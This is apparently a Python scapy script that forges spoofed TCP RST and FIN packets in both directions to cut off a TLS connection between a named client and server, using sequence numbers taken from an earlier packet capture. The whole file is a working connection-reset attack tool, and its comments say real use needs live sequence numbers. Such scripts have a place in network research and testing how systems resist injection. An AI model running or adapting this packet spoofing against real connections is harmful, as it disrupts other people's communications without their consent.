#!/usr/bin/env python3
"""
Simple RST injection test - send RST without sniffing first.
Uses sequence numbers from previous captures.
"""
from scapy.all import conf
from pathlib import Path
import os
from scapy.all import IP, TCP, send
import sys
import time

# From deep_config3.pcapng:
# Server 172.67.200.91:443 -> Client 192.168.0.101:60752
# ServerHello at frame 14: seq=2772430221, len=1448
# So server next seq = 2772430221 + 1448 = 2772431669
# Client ack = 2137503609

SERVER_IP = "172.67.200.91"
SERVER_PORT = 443
CLIENT_IP = "192.168.0.101"
CLIENT_PORT = 60752
SERVER_NEXT_SEQ = 2772431669  # Approximate
CLIENT_ACK = 2137503609

print("Sending RST injection test packets...")
print(f"Server: {SERVER_IP}:{SERVER_PORT}")
print(f"Client: {CLIENT_IP}:{CLIENT_PORT}")
print(f"Server next seq: {SERVER_NEXT_SEQ}")
print(f"Client ack: {CLIENT_ACK}")
print()

# Test 1: Valid RST server->client
print("[TEST 1] Valid RST server->client...")
pkt = IP(src=SERVER_IP, dst=CLIENT_IP) / TCP(
    sport=SERVER_PORT, dport=CLIENT_PORT,
    flags="R", seq=SERVER_NEXT_SEQ, ack=CLIENT_ACK, window=65535
)
send(pkt, verbose=False)
print("  Sent valid RST S2C")
time.sleep(0.1)

# Test 2: Invalid RST server->client (seq+1)
print("[TEST 2] Invalid RST server->client (seq+1)...")
pkt = IP(src=SERVER_IP, dst=CLIENT_IP) / TCP(
    sport=SERVER_PORT, dport=CLIENT_PORT,
    flags="R", seq=SERVER_NEXT_SEQ + 1, ack=CLIENT_ACK, window=65535
)
send(pkt, verbose=False)
print("  Sent invalid RST S2C")
time.sleep(0.1)

# Test 3: RST client->server (spoofed)
print("[TEST 3] RST client->server (spoofed)...")
pkt = IP(src=CLIENT_IP, dst=SERVER_IP) / TCP(
    sport=CLIENT_PORT, dport=SERVER_PORT,
    flags="R", seq=CLIENT_ACK, ack=SERVER_NEXT_SEQ, window=65535
)
send(pkt, verbose=False)
print("  Sent RST C2S")
time.sleep(0.1)

# Test 4: FIN server->client
print("[TEST 4] FIN server->client...")
pkt = IP(src=SERVER_IP, dst=CLIENT_IP) / TCP(
    sport=SERVER_PORT, dport=CLIENT_PORT,
    flags="FA", seq=SERVER_NEXT_SEQ, ack=CLIENT_ACK, window=65535
)
send(pkt, verbose=False)
print("  Sent FIN S2C")
time.sleep(0.1)

# Test 5: FIN client->server (spoofed)
print("[TEST 5] FIN client->server (spoofed)...")
pkt = IP(src=CLIENT_IP, dst=SERVER_IP) / TCP(
    sport=CLIENT_PORT, dport=SERVER_PORT,
    flags="FA", seq=CLIENT_ACK, ack=SERVER_NEXT_SEQ, window=65535
)
send(pkt, verbose=False)
print("  Sent FIN C2S")

print("\nAll injection packets sent.")
print("Note: Sequence numbers are from a previous capture and may not match current connection.")
print("This test is for demonstration - real injection needs live sequence numbers.")
